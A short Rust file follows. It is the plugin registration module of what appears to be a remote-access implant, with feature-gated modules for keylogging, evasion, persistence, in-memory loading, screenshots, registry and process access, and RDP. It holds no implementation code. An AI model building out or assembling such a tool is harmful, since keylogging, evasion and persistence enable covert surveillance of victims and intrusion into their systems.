// Plugin composition: each plugin is registered here, gated by its feature.
// A plugin that is not compiled in (feature off) simply has no commands.

pub mod core;
pub mod fs;

#[cfg(feature = "screenshot")]
pub mod screenshot;

#[cfg(feature = "keylog")]
pub mod keylog;

#[cfg(feature = "memload")]
pub mod memload;

#[cfg(feature = "evasion")]
pub mod evasion;

#[cfg(feature = "registry")]
pub mod registry;

#[cfg(feature = "persist")]
pub mod persist;

#[cfg(feature = "process")]
pub mod process;

#[cfg(feature = "rdp")]
pub mod rdp;

#[cfg(feature = "rcp")]
pub mod rcp;

/// Register all enabled plugins into the registry.
pub fn register_all(r: &mut crate::registry::Registry) -> Result<(), String> {
    core::register(r)?;
    fs::register(r)?;
    #[cfg(feature = "screenshot")]
    screenshot::register(r)?;
    #[cfg(feature = "keylog")]
    keylog::register(r)?;
    #[cfg(feature = "memload")]
    memload::register(r)?;
    #[cfg(feature = "evasion")]
    evasion::register(r)?;
    #[cfg(feature = "registry")]
    registry::register(r)?;
    #[cfg(feature = "persist")]
    persist::register(r)?;
    #[cfg(feature = "process")]
    process::register(r)?;
    #[cfg(feature = "rdp")]
    rdp::register(r)?;
    #[cfg(feature = "rcp")]
    rcp::register(r)?;
    Ok(())
}
